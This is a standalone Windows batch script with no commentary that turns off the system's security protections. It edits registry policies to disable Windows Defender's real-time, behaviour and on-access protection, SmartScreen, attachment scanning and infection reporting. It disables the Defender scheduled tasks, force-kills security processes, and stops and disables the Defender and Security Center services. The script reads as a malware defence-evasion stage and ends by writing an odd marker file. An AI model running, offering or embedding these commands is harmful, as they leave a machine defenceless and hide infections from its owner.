REG ADD "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD  /f
REG ADD "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /d 1 /t REG_DWORD  /f
REG ADD "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /d 1 /t REG_DWORD  /f
REG ADD "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /d 1 /t REG_DWORD  /f
REG ADD "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d 1 /t REG_DWORD  /f
REG ADD "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /d 1 /t REG_DWORD  /f
REG ADD "HKLM\Software\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /d 2 /t REG_DWORD  /f
REG ADD "HKLM\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /d 1 /t REG_DWORD  /f
REG ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /d 0 /t REG_DWORD  /f
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /disable &schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /disable &schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /disable &schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /disable &schtasks /change /tn "\Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /disable
REG ADD "HKLM\Software\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /d 1 /t REG_DWORD  /f
REG ADD "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD  /f


REG ADD "HKLM\SOFTWARE\Classes\CLSID\{09A47860-11B0-4DA5-AFA5-26D86198A780}\InprocServer32" /v "" /d "" /f
REG ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /d 0 /t REG_DWORD  /f

REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /d 0 /t REG_DWORD /f
REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ConfigureAppInstallControl" /d "Anywhere" /f
REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ConfigureAppInstallControlEnabled" /d 1  /t REG_DWORD /f

REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation"" /d 0 /t REG_DWORD /f
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /d "off" /f
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v ScanWithAntiVirus /d 0 /t REG_DWORD /f
taskkill /f /im NisSrv.exe
taskkill /f /im MSASCuiL.exe
taskkill /f /im SecurityHealthSystray.exe
taskkill /f /im SecurityHealthService.exe
taskkill /f /im smartscreen.exe
taskkill /f /im SecurityHealthSystray.exe
taskkill /f /im SecurityHealthService.exe
taskkill /f /im SecurityHealthHost.exe
taskkill /f /im MpCmdRun.exe
taskkill /f /im smartscreen.exe
taskkill /f /im MSASCuiL.exe
taskkill /f /im MpCmdRun.exe
taskkill /f /im AM_Engine.exe
powershell.exe -command foreach ($serv in ('WinDefend','SgrmBroker','Sense','SecurityHealthService','WdNisSvc','wscsvc')) { stop-service $serv; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\$serv" /v Start /t reg_dword /d "4" /f}
cmd.exe /c sc stop windefend & sc stop wscsvc & sc config windefend start=disabled & sc config wscsvc start=disabled
echo lol > C:\lmbmi2\win11
exit